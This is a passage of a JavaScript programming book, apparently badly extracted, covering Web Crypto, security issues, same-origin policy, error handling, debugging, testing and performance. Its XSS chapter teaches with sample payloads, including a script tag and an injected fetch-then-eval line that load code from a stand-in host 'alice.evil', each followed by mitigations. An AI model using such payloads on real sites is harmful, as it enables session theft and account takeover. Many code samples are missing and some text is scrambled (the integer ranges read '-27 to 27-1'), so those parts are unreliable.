crypto.getRandomValues(array) can be used with instances of the following classes (described further in Binary Data) and will generate values from the given ranges (both ends inclusive):
Int8Array: -27 to 27-1
Uint8Array: 0 to 28-1
Int16Array: -215 to 215-1 Uint16Array: 0 to 216-1
Int32Array: -231 to 231-1
Uint32Array: 0 to 231-1
Section 94.3: Generating RSA key pair and converting to PEM format
In this example you will learn how to generate RSA-OAEP key pair and how to convert private key from this key pair to base64 so you can use it with OpenSSL etc. Please note that this process can also be used for public key you just have to use prefix and suffix below:

NOTE: This example is fully tested in these browsers: Chrome, Firefox, Opera, Vivaldi


That's it! Now you have a fully working and compatible RSA-OAEP Private Key in PEM format which you can use wherever you want. Enjoy!
Section 94.4: Converting PEM key pair to CryptoKey
So, have you ever wondered how to use your PEM RSA key pair that was generated by OpenSSL in Web Cryptography API? If the answers is yes. Great! You are going to find out.
NOTE: This process can also be used for public key, you only need to change prefix and suffix to:

This example assumes that you have your RSA key pair generated in PEM.

And now you're done! You can use your imported key in WebCrypto API.

Chapter 95: Security issues
This is a collection of common JavaScript security issues, like XSS and eval injection. This collection also contains how to mitigate these security issues.
Section 95.1: Reflected Cross-site scripting (XSS)
Let's say Joe owns a website that allows you to log on, view puppy videos, and save them to your account.
https://example.com/search?q=brown+puppiesWhenever a user searches on that website, they are redirected to .
If a user's search doesn't match anything, than they see a message along the lines of:
		Your search (brown puppies), didn't match anything. Try again.
On the backend, that message is displayed like this:

<h1>headings</h1However, when Alice searches for >, she gets this back:
Your search (headings
) didn't match anything. Try again.
Raw HTML:
Your search (<b><h1>headings</h1></b>) didn't match anything. Try again.
<script>alert(1)</scriptThan Alice searches for >, she sees:
		Your search (), didn't match anything. Try again.
And:

<script src = "https://alice.evil/puppy_xss.js></script>really cute puppiesThan Alice searches for , and copies the link in her address bar, and then emails Bob:
		Bob,
		When I search for cute puppies, nothing happens!
Than Alice successfully gets Bob to run her script while Bob is logged on to his account.
Mitigation:
1. Escape all angle brackets in searches before returning the search term when no results are found.
2. Don't return the search term when no results are found.
3. Add a Content Security Policy that refuses to load active content from other domains
  Section 95.2: Persistent Cross-site scripting (XSS)
Let's say that Bob owns a social website that allows users to personalize their profiles.
Alice goes to Bob's website, creates an account, and goes to her profile settings. She sets her profile description to I'm actually too lazy to write something here.
When her friends view her profile, this code gets run on the server:

Resulting in this HTML:

<b>I like HTML</bThan Alice sets her profile description to >. When she visits her profile, instead of seeing
		<b>I like HTML</b>
she sees
		I like HTML
Then Alice sets her profile to

Whenever someone visits her profile, they get Alice's script run on Bob's website while logged on as their account.
Mitigation
1. Escape angle brackets in profile descriptions, etc.
2. Store profile descriptions in a plain text file that is then fetched with a script that adds the description via
.innerText
3. Add a Content Security Policy that refuses to load active content from other domains
Section 95.3: Persistent Cross-site scripting from JavaScript string literals
Let's say that Bob owns a site that lets you post public messages.
The messages are loaded by a script that looks like this:

The addMessage function adds a posted message to the DOM. However, in an effort to avoid XSS, any HTML in messages posted is escaped.
The script is generated on the server like this:

My mom said: "Life is good. Pie makes it better. "So alice posts a message that says: . Than when she previews the message, instead of seeing her message she sees an error in the console:

Why? Because the generated script looks like this:

That's a syntax error. Than Alice posts:
 I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);// Then the generated script looks like: addMessage("I like pie ");fetch("https://alice.evil/js_xss.js").then(x=>x.text()).then(eval);//");
https://alice.evil/js_xss.jsThat adds the message I like pie, but it also downloads and runs  whenever someone visits Bob's site.
Mitigation:
1. Pass the message posted into JSON.stringify()
2. Instead of dynamically building a script, build a plain text file containing all the messages that is later fetched by the script
3. Add a Content Security Policy that refuses to load active content from other domains
Section 95.4: Why scripts from other people can harm your website and its visitors
If you don't think that malicious scripts can harm your site, you are wrong. Here is a list of what a malicious script could do:
1. Remove itself from the DOM so that it can't be traced
2. Steal users' session cookies and enable the script author to log in as and impersonate them
3. Show a fake "Your session has expired. Please log in again." message that sends the user's password to the script author.
4. Register a malicious service worker that runs a malicious script on every page visit to that website.
5. Put up a fake paywall demanding that users pay money to access the site that actually goes to the script author.
Please, don't think that XSS won't harm your website and its visitors.
Section 95.5: Evaled JSON injection
Let's say that whenever someone visits a profile page in Bob's website, the following URL is fetched:

With a response like this:

Than that data is parsed & inserted:
var data = eval("(" + resp + ")"); document.getElementById("#name").innerText = data.name;
document.getElementById("#description").innerText = data.description;
Seems good, right? Wrong.
Likes XSS."});alert(1);({"name":"Alice","description":"Likes XSS.What if someone's description is ?
Seems weird, but if poorly done, the response will be:


If you don't think that's a problem, paste that in your console and see what happens.
Mitigation
 Use JSON.parse instead of eval to get JSON. In general, don't use eval, and definitely don't use eval with something a user could control. Eval creates a new execution context, creating a performance hit.

Will be converted to:

Oops. Remember to escape both the \ and ", or just use JSON.parse.

Chapter 96: Same Origin Policy & CrossOrigin Communication
Same-Origin policy is used by web browsers to prevent scripts to be able to access remote content if the remote address has not the same origin of the script. This prevents malicious scripts from performing requests to other websites to obtain sensitive data.
The origin of two addresses is considered the same if both URLs have the same protocol, hostname and port.
Section 96.1: Safe cross-origin communication with messages
window.postMessage() method together with its relative event handler window.onmessageThe  can be safely used to enable cross-origin communication.
postMessage()postMessage()The  method of the target window can be called to send a message to another window, which will be able to intercept it with its onmessage event handler, elaborate it, and, if necessary, send a response back to the sender window using  again.
Example of Window communicating with a children frame


Section 96.2: Ways to circumvent Same-Origin Policy
As far as client-side JavaScript engines are concerned (those running inside a browser), there is no straightforward solution available for requesting content from sources other than the current domain. (By the way, this limitation does not exist in JavaScript-server tools such as Node JS.)
However, it is (in some situations) indeed possible to retrieve data from other sources using the following methods. Please do note that some of them may present hacks or workarounds instead of solutions production system should rely on.
Method 1: CORS
AccessMost public APIs today allow developers to send data bidirectionally between client and server by enabling a feature called CORS (Cross-Origin Resource Sharing). The browser will check if a certain HTTP header (-
Control-Allow-Origin) is set and that the requesting site's domain is listed in the header's value. If it is, then the
browser will allow establishing AJAX connections.
However, because developers cannot change other servers' response headers, this method can't always be relied on.
Method 2: JSONP
JSON with Padding is commonly blamed to be a workaround. It is not the most straightforward method, but it still gets the job done. This method takes advantage of the fact that script files can be loaded from any domain. Still, it is crucial to mention that requesting JavaScript code from external sources is always a potential security risk and this should generally be avoided if there's a better solution available.
The data requested using JSONP is typically JSON, which happens to fit the syntax used for object definition in JavaScript, making this method of transport very simple. A common way to let websites use the external data obtained via JSONP is to wrap it inside a callback function, which is set via a GET parameter in the URL. Once the external script file loads, the function will be called with the data as its first parameter.

http://example.com/api/endpoint.js?callback=myfuncThe contents of  might look like this:

The function always has to be defined first, otherwise it won't be defined when the external script loads.

Chapter 97: Error Handling
Section 97.1: Error objects
Runtime errors in JavaScript are instances of the Error object. The Error object can also be used as-is, or as the base for user-defined exceptions. It's possible to throw any type of value - for example, strings - but you're strongly encouraged to use Error or one of its derivatives to ensure that debugging information -- such as stack traces -- is correctly preserved.
The first parameter to the Error constructor is the human-readable error message. You should try to always specify a useful error message of what went wrong, even if additional information can be found elsewhere.

Section 97.2: Interaction with Promises
Version ≥ 6
Exceptions are to synchronous code what rejections are to promise-based asynchronous code. If an exception is thrown in a promise handler, its error will be automatically caught and used to reject the promise instead.

 

Version > 7
The async functions proposal-expected to be part of ECMAScript 2017-extends this in the opposite direction. If you await a rejected promise, its error is raised as an exception:

 

Section 97.3: Error types
There are six specific core error constructors in JavaScript:
evalEvalError - creates an instance representing an error that occurs regarding the global function ().
InternalError - creates an instance representing an error that occurs when an internal error in the
JavaScript engine is thrown. E.g. "too much recursion". (Supported only by Mozilla Firefox)
 RangeError - creates an instance representing an error that occurs when a numeric variable or parameter is outside of its valid range.
 ReferenceError - creates an instance representing an error that occurs when dereferencing an invalid reference.
evalSyntaxError - creates an instance representing a syntax error that occurs while parsing code in ().
TypeError - creates an instance representing an error that occurs when a variable or parameter is not of a valid type.
encodeURI() or decodeURI URIError - creates an instance representing an error that occurs when 	() are passed invalid parameters.
If you are implementing error handling mechanism you can check which kind of error you are catching from code.

In such case e will be an instance of TypeError. All error types extend the base constructor Error, therefore it's also an instance of Error.
Keeping that in mind shows us that checking e to be an instance of Error is useless in most cases.
Section 97.4: Order of operations plus advanced thoughts
Without a try catch block, undefined functions will throw errors and stop execution:
undefinedFunction("This will not get executed");
 console.log("I will never run because of the uncaught error!"); Will throw an error and not run the second line:

You need a try catch block, similar to other languages, to ensure you catch that error so code can continue to execute:

Now, we've caught the error and can be sure that our code is going to execute

What if an error occurs in our catch block!?

We won't process the rest of our catch block, and execution will halt except for the finally block.

You could always nest your try catch blocks.. but you shouldn't because that will get extremely messy..

Will catch all errors from the previous example and log the following:

So, how can we catch all errors!? For undefined variables and functions: you can't.
Also, you shouldn't wrap every variable and function in a try/catch block, because these are simple examples that will only ever occur once until you fix them. However, for objects, functions and other variables that you know exist, but you don't know whether their properties or sub-processes or side-effects will exist, or you expect some error states in some circumstances, you should abstract your error handling in some sort of manner. Here is a very basic example and implementation.
Without a protected way to call untrusted or exception throwing methods:

And with protection:

We catch errors and still process all the expected code, though with a somewhat different syntax. Either way will work, but as you build more advanced applications you will want to start thinking about ways to abstract your error handling.
Chapter 98: Global error handling in browsers
	Parameter	Details
Some browsers will call the event handler with just one argument, an Event object. However,
eventOrMessage other browsers, especially the older ones and older mobile ones will supply a String message as a first argument.
                If a handler is called with more than 1 argument, the second argument usually is an URL of a url
JavaScript file that is the source of the problem.
                If a handler is called with more than 1 argument, the third argument is a line number inside the lineNumber
JavaScript source file.
                If a handler is called with more than 1 argument, the fourth argument is the column number colNumber inside the JavaScript source file.
                If a handler is called with more than 1 argument, the fifth argument is sometimes an Error object error describing the problem.
Section 98.1: Handling window.onerror to report all errors back to the server-side
window.onerrorThe following example listens to  event and uses an image beacon technique to send the information through the GET parameters of an URL.
var hasLoggedOnce = false;
// Some browsers (at least Firefox) don't report line and column numbers
// when event is handled through window.addEventListener('error', fn). That's why // a more reliable approach is to set an event listener via direct assignment. window.onerror = function (eventOrMessage, url, lineNumber, colNumber, error) {     if (hasLoggedOnce || !eventOrMessage) {
        // It does not make sense to report an error if:
        // 1. another one has already been reported -- the page has an invalid state and may produce way too many errors.
        // 2. the provided information does not make sense (!eventOrMessage -- the browser didn't supply information for some reason.)         return;     }     hasLoggedOnce = true;     if (typeof eventOrMessage !== 'string') {         error = eventOrMessage.error;         url = eventOrMessage.filename || eventOrMessage.fileName;         lineNumber = eventOrMessage.lineno || eventOrMessage.lineNumber;         colNumber = eventOrMessage.colno || eventOrMessage.columnNumber;         eventOrMessage = eventOrMessage.message || eventOrMessage.name || error.message || error.name;     }     if (error && error.stack) {         eventOrMessage = [eventOrMessage, '; Stack: ', error.stack, '.'].join('');     }     var jsFile = (/[^/]+\.js/i.exec(url || '') || [])[0] || 'inlineScriptOrDynamicEvalCode',         stack = [eventOrMessage, ' Occurred in ', jsFile, ':', lineNumber || '?', ':', colNumber || '?'].join('');
    // shortening the message a bit so that it is more likely to fit into browser's URL length limit
(which is 2,083 in some browsers)     stack = stack.replace(/https?\:\/\/[^/]+/gi, '');
    // calling the server-side handler which should probably register the error in a database or a log file


Chapter 99: Debugging
Section 99.1: Interactive interpreter variables
Note that these only work in the developer tools of certain browsers.
$_ gives you the value of whatever expression was evaluated last.

<div id="foo"$0 refers to the DOM element currently selected in the Inspector. So if > is highlighted:

$1 refers to the element previously selected, $2 to the one selected before that, and so forth for $3 and $4.
$$(selectorTo get a collection of elements matching a CSS selector, use ). This is essentially a shortcut for
document.querySelectorAll.
var images = $$('img');  // Returns an array or a nodelist of all matching elements
	$_	$()¹ $$() $0	$1	$2	$3	$4
Opera	15+ 11+ 11+ 11+ 11+ 15+ 15+ 15+
Chrome 22+ ✔	✔	✔	✔	✔	✔	✔
Firefox	39+ ✔	✔	✔	×	×	×	×
IE	11	11	11	11	11	11	11	11
Safari	6.1+ 4+	4+	4+	4+	4+	4+	4+
document.getElementById or document.querySelector¹ alias to either 
Section 99.2: Breakpoints
Breakpoints pause your program once execution reaches a certain point. You can then step through the program line by line, observing its execution and inspecting the contents of your variables.
There are three ways of creating breakpoints.
debugger1. From code, using the ; statement.
2. From the browser, using the Developer Tools.
3. From an Integrated Development Environment (IDE).
Debugger Statement
debuggerYou can place a ; statement anywhere in your JavaScript code. Once the JS interpreter reaches that line, it will stop the script execution, allowing you to inspect variables and step through your code.
Developer Tools
The second option is to add a breakpoint directly into the code from the browser's Developer Tools.
Opening the Developer Tools
Chrome or Firefox
1. Press  F12  to open Developer Tools
2. Switch to the Sources tab (Chrome) or Debugger tab (Firefox)
3. Press  Ctrl + P  and type the name of your JavaScript file
 Enter 4. Press  to open it.
Internet Explorer or Edge
1. Press  F12  to open Developer Tools
2. Switch to the Debugger tab.
3. Use the folder icon near the upper-left corner of the window to open a file-selection pane; you can find your JavaScript file there.
Safari
1. Press  Command + Option + C  to open Developer Tools
2. Switch to the Resources tab
3. Open the "Scripts" folder in the left-side panel
4. Select your JavaScript file.
Adding a breakpoint from the Developer Tools
Once you have your JavaScript file open in Developer Tools, you can click a line number to place a breakpoint. The next time your program runs, it will pause there.
Note about Minified Sources: If your source is minified, you can Pretty Print it (convert to readable format). In Chrome, this is done by clicking on the {} button in the bottom right corner of the source code viewer.
IDEs
Visual Studio Code (VSC)
VSC has built-in support for debugging JavaScript.
1. Click the Debug button on the left or  Ctrl + Shift + D 
launch.json2. If not already done, create a launch configuration file () by pressing the gear icon.
3. Run the code from VSC by pressing the green play button or hit  F5 .
Adding a breakpoint in VSC
Click next to the line number in your JavaScript source file to add a breakpoint (it will be marked red). To delete the breakpoint, click the red circle again.
Tip: You can also utilise the conditional breakpoints in browser's dev tools. These help in skipping unnecessary breaks in execution. Example scenario: you want to examine a variable in a loop exactly at 5th iteration.

Section 99.3: Using setters and getters to find what changed a property
Let's say you have an object like this:


myObject.nameLater in your code, you try to access  and you get George instead of Peter. You start wondering who changed it and where exactly it was changed. There is a way to place a debugger (or something else) on every set
myObject.name = 'something'(every time someone does ):

Note that we renamed name to _name and we are going to define a setter and a getter for name.
set name is the setter. That is a sweet spot where you can place debugger, console.traceget name(), or anything else you need for debugging. The setter will set the value for name in _name. The getter (the  part) will read the value from there. Now we have a fully functional object with debugging functionality.
Most of the time, though, the object that gets changed is not under our control. Fortunately, we can define setters and getters on existing objects to debug them.

Check out setters and getters at MDN for more information.
Browser support for setters/getters:
Chrome Firefox IE Opera Safari Mobile
Version 1	2.0	9 9.5	3	all
Section 99.4: Using the console
In many environments, you have access to a global console object that contains some basic methods for communicating with standard output devices. Most commonly, this will be the browser's JavaScript console (see Chrome, Firefox, Safari, and Edge for more information).

You can use different console methods to highlight your output in different ways. Other methods are also useful for more advanced debugging.
For more documentation, information on compatibility, and instructions on how to open your browser's console, see the Console topic.
console.logNote: if you need to support IE9, either remove  or wrap its calls as follows, because console is undefined until the Developer Tools are opened:

Section 99.5: Automatically pausing execution
In Google Chrome, you can pause execution without needing to place breakpoints.
 Pause on Exception: While this button is toggled on, if your program hits an unhandled exception, the program will pause as if it had hit a breakpoint. The button can be found near Execution Controls and is useful for locating errors.
You can also pause execution when an HTML tag (DOM node) is modified, or when its attributes are changed. To do that, right click the DOM node on the Elements tab and select "Break on...".
Section 99.6: Elements inspector
Clicking the  Select an element in the page to inspect it button in the upper left corner of the Elements tab in Chrome or Inspector tab in Firefox, available from Developer Tools, and then clicking on an element of the page highlights the element and assigns it to the $0 variable.
Elements inspector can be used in variety of ways, for example:
1. You can check if your JS is manipulating DOM the way you expect it to,
2. You can more easily debug your CSS, when seeing which rules affect the element (Styles tab in Chrome)
3. You can play around with CSS and HTML without reloading the page.
Also, Chrome remembers last 5 selections in the Elements tab. $0 is the current selection, while $1 is the previous selection. You can go up to $4. That way you can easily debug multiple nodes without constantly switching selection to them.
You can read more at Google Developers.
Section 99.7: Break when a function is called
For named (non-anonymous) functions, you can break when the function is executed.

The next time functionName function runs, the debugger will stop on its first line.
Section 99.8: Stepping through code
Once you've paused execution on a breakpoint, you may want to follow execution line-by-line to observe what happens. Open your browser's Developer Tools and look for the Execution Control icons. (This example uses the icons in Google Chrome, but they'll be similar in other browsers.)
 Resume: Unpause execution. Shorcut: F8 (Chrome, Firefox)
 F6  Step Over: Run the next line of code. If that line contains a function call, run the whole function and move to the next line, rather than jumping to wherever the function is defined. Shortcut :  F10 (Chrome, Firefox, IE/Edge), (Safari)
 Step Into: Run the next line of code. If that line contains a function call, jump into the function and pause there. Shortcut :  F11 (Chrome, Firefox, IE/Edge),  F7 (Safari)
 Step Out: Run the rest of the current function, jump back to where the function was called from, and pause at the next statement there. Shortcut :  Shift  +  F11 (Chrome, Firefox, IE/Edge),  F8 (Safari)
Use these in conjunction with the Call Stack, which will tell you which function you're currently inside of, which function called that function, and so forth.
See Google's guide on "How to Step Through the Code" for more details and advice.
Links to browser shortcut key documentation:
Chrome
Firefox
IE
Edge
Safari
Chapter 100: Unit Testing JavaScript
Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire
Here we have a simple class to be tested that returns a Promise based on the results of an external ResponseProcessor that takes time to execute.
For simplicity we'll assume that the processResponse method won't ever fail.

To test this we can leverage the following tools.
1. mocha
2. chai
3. sinon
4. proxyquire
chai-as-promised5.
package.jsonI use the following test script in my  file.
"test": "NODE_ENV=test mocha --compilers js:babel-core/register --require
./test/unit/test_helper.js  --recursive test/**/*_spec.js"
This allows me to use es6 syntax. It references a test_helper that will look like

chai-as-promisedpingProxyquire allows us to inject our own stub in the place of the external ResponseProcessor. We can then use sinon to spy on that stub's methods. We use the extensions to chai that  injects to check that the () method's promise is fullfilled, and that it eventually returns the required response.


Now instead let's assume you wish to test something that uses the response from ping.

1. sinon
2. proxyquire
sinon-stub-promise3.
sinon-stubAs before, Proxyquire allows us to inject our own stub in the place of the external dependency, in this case the ping method we tested previously. We can then use sinon to spy on that stub's methods and leverage promise to allow us to returnsPromise. This promise can then be resolved or rejected as we wish in the test, in order to test the wrapper's response to that.


Section 100.2: Basic Assertion
At its most basic level, Unit Testing in any language provides assertions against some known or expected output.

The popular assertion method above shows us one quick and easy way to assert a value in most web browsers and interpreters like Node.js with virtually any version of ECMAScript.
A good unit test is designed to test a discreet unit of code; usually a function.

should fail, and the assert method will log a "fail" line.
If we simply modify our expected assertion outcome, the test will succeed and the resulting output would look something like this.

This simple assertion can assure that in many different cases, your "add" function will always return the expected result and requires no additional frameworks or libraries to work.
var result = addA more rigorous set of assertions would look like this (using (x,y) for each assertion):
 assert( result == 0, 'add(0, 0) should return 0...'); assert( result == -1, 'add(0, -1) should return -1...'); assert( result == 1, 'add(0, 1) should return 1...'); And console output would be this:

addWe can now safely say that (x,y)... should return the sum of two integers. We can roll these up into something like this:

Chapter 101: Evaluating JavaScript
Parameter	Details
string	The JavaScript to be evaluated.
eval('2 + 2'In JavaScript, the eval function evaluates a string as if it were JavaScript code. The return value is the result of the evaluated string, e.g. ) returns 4.
eval is available in the global scope. The lexical scope of the evaluation is the local scope unless invoked indirectly
var geval = eval; geval(e.g. (s);).
The use of eval is strongly discouraged. See the Remarks section for details.
Section 101.1: Evaluate a string of JavaScript statements

The use of eval is strongly discouraged. See the Remarks section for details.
Section 101.2: Introduction
You can always run JavaScript from inside itself, although this is strongly discouraged due to the security vulnerabilities it presents (see Remarks for details).
To run JavaScript from inside JavaScript, simply use the below function:

Section 101.3: Evaluation and Math
evalYou can set a variable to something with the () function by using something similar to the below code:

200
4
27
The use of eval is strongly discouraged. See the Remarks section for details.
Chapter 102: Linters - Ensuring code quality
Section 102.1: JSHint
JSHint is an open source tool which detects errors and potential problems in JavaScript code.
To lint your JavaScript you have two options.
1. Go to JSHint.com and paste your code in there on line text editor.
2. Install JSHint in your IDE.
Atom: linter-jshint (must have Linter plugin installed)
Sublime Text: JSHint Gutter and/or Sublime Linter
Vim: jshint.vim or jshint2.vim
Visual Studio: VSCode JSHint
jshintrcA benefit of adding it to your IDE is that you can create a JSON configuration file named . that will be used when linting your program. This is convent if you want to share configurations between projects.
jshintrcExample . file

JSHint also allows configurations for specific lines/blocks of code


More configuration options are documented at http://jshint.com/docs/options/
Section 102.2: ESLint / JSCS
ESLint is a code style linter and formatter for your style guide much like JSHint. ESLint merged with JSCS in April of 2016. ESLint does take more effort to set up than JSHint, but there are clear instructions on their website for getting started.
A sample configuration for ESLint is as follows:

A sample configuration file where ALL rules are set to off, with descriptions for what they do can be found here.
Section 102.3: JSLint
JSLint is the trunk from which JSHint branched. JSLint takes a much more opinionated stance on how to write JavaScript code, pushing you towards only using the parts Douglas Crockford deems to be its "good parts", and away from any code that Crockford believes to have a better solution. The following StackOverflow thread may help you decide which linter is right for you. While there are differences (here are some brief comparisons between it and JSHint / ESLint), each option is extremely customizable.
For a more information about configuring JSLint check out NPM or github.
Chapter 103: Anti-patterns
Section 103.1: Chaining assignments in var declarations
Chaining assignments as part of a var declaration will create global variables unintentionally.
For example:

Will result in:

In the above example, a is local but b becomes global. This is because of the right to left evaluation of the = operator. So the above code actually evaluated as

The correct way to chain var assignments is:

Or:

This will make sure that both a and b will be local variables.
Chapter 104: Performance Tips
JavaScript, like any language, requires us to be judicious in the use of certain language features. Overuse of some features can decrease performance, while some techniques can be used to increase performance.
Section 104.1: Avoid try/catch in performance-critical functions
Some JavaScript engines (for example, the current version of Node.js and older versions of Chrome before Ignition+turbofan) don't run the optimizer on functions that contain a try/catch block.
If you need to handle exceptions in performance-critical code, it can be faster in some cases to keep the try/catch in a separate function. For example, this function will not be optimized by some implementations:

However, you can refactor to move the slow code into a separate function (that can be optimized) and call it from inside the try block.

Here's a jsPerf benchmark showing the difference: https://jsperf.com/try-catch-deoptimization. In the current version of most browsers, there shouldn't be much difference if any, but in less recent versions of Chrome and Firefox, or IE, the version that calls a helper function inside the try/catch is likely to be faster.
Note that optimizations like this should be made carefully and with actual evidence based on profiling your code. As
JavaScript engines get better, it could end up hurting performance instead of helping, or making no difference at all (but complicating the code for no reason). Whether it helps, hurts, or makes no difference can depend on a lot of factors, so always measure the effects on your code. That's true of all optimizations, but especially microoptimizations like this that depend on low-level details of the compiler/runtime.
Section 104.2: Limit DOM Updates
A common mistake seen in JavaScript when run in a browser environment is updating the DOM more often than necessary.
The issue here is that every update in the DOM interface causes the browser to re-render the screen. If an update changes the layout of an element in the page, the entire page layout needs to be re-computed, and this is very performance-heavy even in the simplest of cases. The process of re-drawing a page is known as reflow and can cause a browser to run slowly or even become unresponsive.
The consequence of updating the document too frequently is illustrated with the following example of adding items to a list.
<ulConsider the following document containing a > element:

We add 5000 items to the list looping 5000 times (you can try this with a larger number on a powerful computer to increase the effect).

In this case, the performance can be improved by batching all 5000 changes in one single DOM update.

document.createDocumentFragmentThe function () can be used as a lightweight container for the HTML created by
the loop. This method is slightly faster than modifying the container element's innerHTML property (as shown below).

Section 104.3: Benchmarking your code - measuring execution time
Most performance tips are very dependent of the current state of JS engines and are expected to be only relevant at a given time. The fundamental law of performance optimization is that you must first measure before trying to optimize, and measure again after a presumed optimization.
To measure code execution time, you can use different time measurement tools like:
Performance interface that represents timing-related performance information for the given page (only available in browsers).
process.hrtime on Node.js gives you timing information as [seconds, nanoseconds] tuples. Called without argument it returns an arbitrary time but called with a previously returned value as argument it returns the difference between the two executions.
console.time("labelName"Console timers ) starts a timer you can use to track how long an operation takes. You
give each timer a unique label name, and may have up to 10,000 timers running on a given page. When you call
console.timeEnd("labelName") with the same name, the browser will finish the timer for given name and output
the time in milliseconds, that elapsed since the timer was started. The strings passed to time() and timeEnd() must match otherwise the timer will not finish.
Date.nowDate.now function () returns current Timestamp in milliseconds, which is a Number representation of time since 1 January 1970 00:00:00 UTC until now. The method now() is a static method of Date, therefore you always use it as Date.now().
performance.nowExample 1 using: ()
In this example we are going to calculate the elapsed time for the execution of our function, and we are going to use the Performance.now() method that returns a DOMHighResTimeStamp, measured in milliseconds, accurate to one thousandth of a millisecond.

The result in console will look something like this:

performance.nowUsage of () has the highest precision in browsers with accuracy to one thousandth of a millisecond, but the lowest compatibility.
Date.nowExample 2 using: ()
In this example we are going to calculate the elapsed time for the initialization of a big array (1 million values), and
Date.nowwe are going to use the () method
let t0 = Date.now(); //stores current Timestamp in milliseconds since 1 January 1970 00:00:00 UTC let arr = []; //store empty array for (let i = 0; i < 1000000; i++) { //1 million iterations    arr.push(i); //push current i value

console.time("label") & console.timeEnd("label"Example 3 using: )
console.time("label"console.timeEnd("label"In this example we are doing the same task as in Example 2, but we are going to use the ) & ) methods

process.hrtimeExemple 4 using ()
In Node.js programs this is the most precise way to measure spent time.

Section 104.4: Use a memoizer for heavy-computing functions
If you are building a function that may be heavy on the processor (either clientside or serverside) you may want to consider a memoizer which is a cache of previous function executions and their returned values. This allows you to check if the parameters of a function were passed before. Remember, pure functions are those that given an input, return a corresponding unique output and don't cause side-effects outside their scope so, you should not add memoizers to functions that are unpredictable or depend on external resources (like AJAX calls or randomly returned values).
Let's say I have a recursive factorial function:

If I pass small values from 1 to 100 for example, there would be no problem, but once we start going deeper, we might blow up the call stack or make the process a bit painful for the JavaScript engine we're doing this in, especially if the engine doesn't count with tail-call optimization (although Douglas Crockford says that native ES6 has tail-call optimization included).
We could hard code our own dictionary from 1 to god-knows-what number with their corresponding factorials but, I'm not sure if I advise that! Let's create a memoizer, shall we?


Now we can start using it:

Now that I start to reflect on what I did, if I were to increment from 1 instead of decrement from num, I could have cached all of the factorials from 1 to num in the cache recursively, but I will leave that for you.
This is great but what if we have multiple parameters? This is a problem? Not quite, we can do some nice tricks like using JSON.stringify() on the arguments array or even a list of values that the function will depend on (for object-oriented approaches). This is done to generate a unique key with all the arguments and dependencies included.
We can also create a function that "memoizes" other functions, using the same scope concept as before (returning a new function that uses the original and has access to the cache object):
var args WARNING: ES6 syntax, if you don't like it, replace ... with nothing and use the =
Array.prototype.slice.call(null, arguments); trick; replace const and let with var, and the other things you
already know.


func.apply(null, argsNow notice that this will work for multiple arguments but won't be of much use in object-oriented methods I think, you may need an extra object for dependencies. Also, ) can be replaced with
func(...args) since array destructuring will send them separately instead of as an array form. Also, just for
Function.prototype.applyreference, passing an array as an argument to func won't work unless you use  as I did.
To use the above method you just:

Section 104.5: Initializing object properties with null
All modern JavaScript JIT compilers trying to optimize code based on expected object structures. Some tip from mdn.
Fortunately, the objects and properties are often "predictable", and in such cases their underlying structure can also be predictable. JITs can rely on this to make predictable accesses faster.
The best way to make object predictable is to define a whole structure in a constructor. So if you're going to add some extra properties after object creation, define them in a constructor with null. This will help the optimizer to predict object behavior for its whole life cycle. However all compilers have different optimizers, and the performance increase can be different, but overall it's good practice to define all properties in a constructor, even when their value is not yet known.
Time for some testing. In my test, I'm creating a big array of some class instances with a for loop. Within the loop, I'm assigning the same string to all object's "x" property before array initialization. If constructor initializes "x" property with null, array always processes better even if it's doing extra statement.
This is code:


This is the result for Chrome and Firefox.

As we can see, the performance improvements are very different between the two.
Section 104.6: Reuse objects rather than recreate


Loop B is 4 (400%) times faster than Loop A
testtest1It is very inefficient to create a new object in performance code. Loop A calls function () which returns a new object every call. The created object is discarded every iteration, Loop B calls () that requires the object returns to be supplied. It thus uses the same object and avoids allocation of a new object, and excessive GC hits.
(GC were not included in the performance test)

Section 104.7: Prefer local variables to globals, attributes, and indexed values
JavaScript engines first look for variables within the local scope before extending their search to larger scopes. If the variable is an indexed value in an array, or an attribute in an associative array, it will first look for the parent array before it finds the contents.
This has implications when working with performance-critical code. Take for instance a common for loop:


For every iteration in for loop, the engine will lookup items, lookup the length attribute within items, lookup items again, lookup the value at index i of items, and then finally lookup global_variable, first trying the local scope before checking the global scope.
A performant rewrite of the above function is:

For every iteration in the rewritten for loop, the engine will lookup li, lookup items, lookup the value at index i, and lookup local_variable, this time only needing to check the local scope.
Section 104.8: Be consistent in use of Numbers
If the engine is able to correctly predict you're using a specific small type for your values, it will be able to optimize the executed code.
In this example, we'll use this trivial function summing the elements of an array and outputting the time it took:

Let's make an array and sum the elements:

Result:

Now, let's do the same but with only integers:

Result:

Summing integers took half the time here.
Engines don't use the same types you have in JavaScript. As you probably know, all numbers in JavaScript are IEEE754 double precision floating point numbers, there's no specific available representation for integers. But engines, when they can predict you only use integers, can use a more compact and faster to use representation, for example, short integers.
This kind of optimization is especially important for computation or data intensive applications.

Chapter 105: Memory eciency
Section 105.1: Drawback of creating true private method
One drawback of creating private method in JavaScript is memory-inefficient because a copy of the private method will be created every time a new instance is created. See this simple example.

When you create few instances, they all have a copy of formatPhoneNumber method

Thus, would be great to avoid using private method only if it's necessary.
Appendix A: Reserved Keywords
Certain words - so-called keywords - are treated specially in JavaScript. There's a plethora of different kinds of keywords, and they have changed in different versions of the language.
Section A.1: Reserved Keywords
JavaScript has a predefined collection of reserved keywords which you cannot use as variables, labels, or function names.
ECMAScript 1 Version = 1
A - EE - RS - Zbreakexportsupercaseextendsswitchcatchfalsethisclassfinallythrowconstfortruecontinuefunctiontry
debuggeriftypeofdefault importvardelete invoiddo	newwhileelse	nullwithenum	return
ECMAScript 2
Added 24 additional reserved keywords. (New additions in bold). Version = 3 Version = E4X
A - F	F - PP - Zabstractfinalpublicboolean finallyreturnbreak	floatshortbyte	forstaticcase	functionsupercatch	gotoswitchchar	ifsynchronizedclass	implementsthis const	import	throw continuein	throws
debuggerinstanceoftransient
defaultinttruedeleteinterfacetrydolongtypeofdoublenativevarelsenewvoidenumnullvolatileexportpackagewhileextendsprivatewithfalse	protected
ECMAScript 5 / 5.1
There was no change since ECMAScript 3.
ECMAScript 5 removed int, byte, char, goto, long, final, float, short, double, native, throws, boolean, abstract, volatile, transient, and synchronized; it added let and yield.
A - FF - PP - Zbreakfinallypubliccaseforreturncatchfunctionstaticclassifsuperconst	implementsswitch continueimport	this debuggerin	throw
